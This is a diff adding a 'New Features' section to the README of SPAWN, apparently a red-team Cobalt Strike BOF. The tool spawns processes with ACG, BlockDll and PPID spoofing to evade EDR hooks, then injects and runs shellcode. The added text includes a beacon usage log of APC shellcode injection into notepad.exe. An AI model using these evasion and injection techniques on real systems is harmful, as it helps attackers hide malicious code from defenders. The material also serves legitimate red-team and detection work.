@@ -1,6 +1,21 @@
 ## SPAWN - Cobalt Strike BOF
 Cobalt Strike BOF that spawns a process, then injects & executes shellcode. Built to evade EDR/UserLand hooks by spawning the process with Arbitrary Code Guard (ACG), BlockDll, and PPID spoofing.
 
+
+## New Features (08/01/2021)
++ Spawn process with Arbitrary Code Guard (ACG) to prevent EDR solutions from hooking the process.
++ Inject & Execute shellcode.
+```bash
+beacon> spawn notepad.exe 6248 /Users/bobby.cooke/git/boku7/SPAWN/popCalc.bin
+[*] SPAWN (Bobby Cooke//SpiderLabs|@0xBoku|github.com/boku7)
+[+] Opened handle 0x48c to process 6248(PID)
+[+] Spawned process: notepad.exe | PID: 4240 | PPID: 6248
+[+] Allocated RE memory in remote process 4240 (PID) at: 0x0000025DBC470000
+[+] Wrote 280 bytes to memory in remote process 4240 (PID) at 0x0000025DBC470000
+[+] APC queued for main thread of 4240 (PID) to shellcode address 0x0000025DBC470000
+[+] Thread resumed and shellcode is being executed within the remote process!
+```
+
 ## New Features (07/19/2021)
 + CNA Agressor Script interface
 ```bash
